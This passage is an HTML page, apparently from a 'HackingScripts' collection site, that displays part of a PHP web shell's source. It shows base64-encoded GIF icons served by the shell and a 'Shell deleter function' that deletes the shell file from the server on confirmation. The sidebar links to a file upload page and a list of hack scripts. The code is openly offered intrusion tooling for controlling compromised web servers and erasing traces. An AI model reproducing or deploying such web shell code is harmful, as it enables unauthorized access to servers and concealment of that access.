<span class="lineno">867</span>   <span class="s2">&quot;compressed&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAOcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP&quot;</span> <span class="o">.</span>
<span class="lineno">868</span>   <span class="s2">&quot;9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/&quot;</span> <span class="o">.</span>
<span class="lineno">869</span>   <span class="s2">&quot;M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmc&quot;</span> <span class="o">.</span>
<span class="lineno">870</span>   <span class="s2">&quot;wzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZ&quot;</span> <span class="o">.</span>
<span class="lineno">871</span>   <span class="s2">&quot;zJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAG&quot;</span> <span class="o">.</span>
<span class="lineno">872</span>   <span class="s2">&quot;b//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZm&quot;</span> <span class="o">.</span>
<span class="lineno">873</span>   <span class="s2">&quot;M2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmT&quot;</span> <span class="o">.</span>
<span class="lineno">874</span>   <span class="s2">&quot;PMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMA&quot;</span> <span class="o">.</span>
<span class="lineno">875</span>   <span class="s2">&quot;zDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAA&quot;</span> <span class="o">.</span>
<span class="lineno">876</span>   <span class="s2">&quot;Bm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAM+4AAN0AALsAAKoAAIgAAHcA&quot;</span> <span class="o">.</span>
<span class="lineno">877</span>   <span class="s2">&quot;AFUAAEQAACIAABEAAADuAADdAAC7AACqAACIAAB3AABVAABEAAAiAAARAAAA7gAA3QAAuwAAqgAAiAAAdwAAVQAARA&quot;</span> <span class="o">.</span>
<span class="lineno">878</span>   <span class="s2">&quot;AAIgAAEe7u7t3d3bu7u6qqqoiIiHd3d1VVVURERCIiIhEREQAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMg&quot;</span> <span class="o">.</span>
<span class="lineno">879</span>   <span class="s2">&quot;ZG9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAAkACwAAAAAFA&quot;</span> <span class="o">.</span>
<span class="lineno">880</span>   <span class="s2">&quot;AWAAAImQBJCCTBqmDBgQgTDmQFAABDVgojEmzI0KHEhBUrWrwoMGNDihwnAvjHiqRJjhX/qVz5D+VHAFZiWmmZ8BGH&quot;</span> <span class="o">.</span>
<span class="lineno">881</span>   <span class="s2">&quot;ji9hxqTJ4ZFAmzc1vpxJgkPPn0Y5CP04M6lPEkCN5mxoJelRqFY5TM36NGrPqV67Op0KM6rYnkup/gMq1mdamC1tdn&quot;</span> <span class="o">.</span>
<span class="lineno">882</span>   <span class="s2">&quot;36lijUpwjr0pSoFyUrmTJLhiTBkqXCgAA7&quot;</span><span class="p">,</span>
<span class="lineno">883</span>   <span class="s2">&quot;sound&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP////8zM8z//8zMzJmZmWYAADMzMwAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
<span class="lineno">884</span>   <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAACACwAAAAAFAAW&quot;</span> <span class="o">.</span>
<span class="lineno">885</span>   <span class="s2">&quot;AAADayi63P4wNsNCkOocYVWPB7FxFwmFwGh+DZpynndpNAHcW9cVQUj8tttrd+G5hMINT7A0BpE4ZnF6hCqn0iryKs&quot;</span> <span class="o">.</span>
<span class="lineno">886</span>   <span class="s2">&quot;0SDN9v0tSc0Q4DQ1SHFRjeBrQ6FzNN5Co2JD4YfUp7GnYsexQLhBiJigsJADs=&quot;</span><span class="p">,</span>
<span class="lineno">887</span>   <span class="s2">&quot;script&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;R0lGODlhFAAWAMIAAP///8z//5mZmTMzMwAAAAAAAAAAAAAAACH+TlRoaXMgYXJ0IGlzIGluIHRoZSBwdWJsaWMgZG&quot;</span> <span class="o">.</span>
<span class="lineno">888</span>   <span class="s2">&quot;9tYWluLiBLZXZpbiBIdWdoZXMsIGtldmluaEBlaXQuY29tLCBTZXB0ZW1iZXIgMTk5NQAh+QQBAAABACwAAAAAFAAW&quot;</span> <span class="o">.</span>
<span class="lineno">889</span>   <span class="s2">&quot;AAADZTi6vPEwDECrnSO+aTvPEddVIrhVBJCSF8QRMIwOBE2fVLrmcYz3O4pgKCDgVMgR0SgZOYVM0dNS/AF7gGy1me&quot;</span> <span class="o">.</span>
<span class="lineno">890</span>   <span class="s2">&quot;16v9vXNdYNf89es2os00bRcDW7DVDDwe87fjMg+v9DNxBzYw8JADs=&quot;</span><span class="p">);</span>
<span class="lineno">891</span>   <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-type: image/gif&#39;</span><span class="p">);</span>
<span class="lineno">892</span>   <span class="k">echo</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]);</span>
<span class="lineno">893</span>   <span class="k">die</span><span class="p">();</span>
<span class="lineno">894</span> <span class="p">}</span>
<span class="lineno">895</span> <span class="k">function</span> <span class="nf">kill</span><span class="p">(){</span> <span class="c1">// Shell deleter function</span>
<span class="lineno">896</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">897</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form  method=&#39;post&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">898</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Type &#39;confirm&#39; to kill the shell:&lt;br&gt;</span><span class="se">\n</span><span class="s2">&lt;input type=&#39;text&#39; name=&#39;ver&#39; action=&#39;?act=kill&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">899</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;Delete&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">900</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">901</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ver&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;confirm&quot;</span><span class="p">){</span>
<span class="lineno">902</span>     <span class="nv">$self</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span>
<span class="lineno">903</span>     <span class="k">if</span><span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$self</span><span class="p">)){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Deleted&quot;</span><span class="p">);}</span>
<span class="lineno">904</span>     <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Failed&quot;</span><span class="p">);}</span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
